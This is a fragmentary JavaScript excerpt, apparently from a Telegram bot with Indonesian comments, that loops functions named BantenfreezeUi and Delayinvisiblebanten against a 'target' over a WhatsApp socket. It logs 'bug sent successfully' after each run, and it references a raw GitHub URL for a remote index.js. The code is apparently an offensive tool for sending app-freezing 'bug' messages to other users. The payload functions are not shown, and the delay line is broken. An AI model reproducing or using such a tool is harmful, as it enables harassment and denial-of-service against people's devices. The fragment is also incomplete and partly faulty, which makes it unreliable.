...
    const repoRaw = "https://raw.githubusercontent.com/leomurphyzgantengg/database/refs/heads/main/index.js";
...
`, { chat_id: chatId, message_id: sentMessage.message_id, parse_mode: "Markdown" });
    ...
    // Eksekusi bug setelah progres selesai
    for (let i = 0; i <= 50; i++) {   
   await BantenfreezeUi(sock, target);
   const delay = ms => new Promise(res => setTimeout(1500));
}
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");
...
`, { chat_id: chatId, message_id: sentMessage.message_id, parse_mode: "Markdown" });
    ...
    // Eksekusi bug setelah progres selesai
    for (let i = 0; i <= 50; i++) {   
   await Delayinvisiblebanten(sock, target);
   await Delayinvisiblebanten(sock, target);
   const delay = ms => new Promise(res => setTimeout(1500));
}
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");
